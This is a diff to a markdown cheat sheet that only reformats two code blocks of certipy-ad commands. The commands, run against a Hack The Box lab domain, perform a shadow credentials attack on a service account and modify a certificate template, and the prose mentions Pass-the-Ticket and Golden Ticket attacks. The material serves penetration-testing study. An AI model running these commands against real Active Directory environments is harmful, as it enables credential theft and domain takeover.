@@ -41,7 +41,8 @@ certipy-ad shadow auto -u <username>@<domain_name> -p '<password>' -dc-ip <domai
 ```
 
 Example : 
-```shell certipy-ad shadow auto -u ryan@sequel.htb -p '<password>' -dc-ip 10.129.251.172 -ns 10.129.251.172 -target dc01.sequel.htb -account ca_svc
+```shell 
+certipy-ad shadow auto -u ryan@sequel.htb -p '<password>' -dc-ip 10.129.251.172 -ns 10.129.251.172 -target dc01.sequel.htb -account ca_svc
 ```
 
 ### Template
@@ -49,7 +50,8 @@ Example :
 This specifies the Kerberos template to use when requesting a Kerberos ticket. This template is used when performing actions like generating tickets or performing Kerberos-based attacks (like Pass-the-Ticket (PTT) or Golden Ticket).
 
 Example: 
-```shell KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad template -k -template DunderMifflinAuthentication -target dc01.sequel.htb -dc-ip 10.129.251.172
+```shell 
+KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad template -k -template DunderMifflinAuthentication -target dc01.sequel.htb -dc-ip 10.129.251.172
 ```
 
 
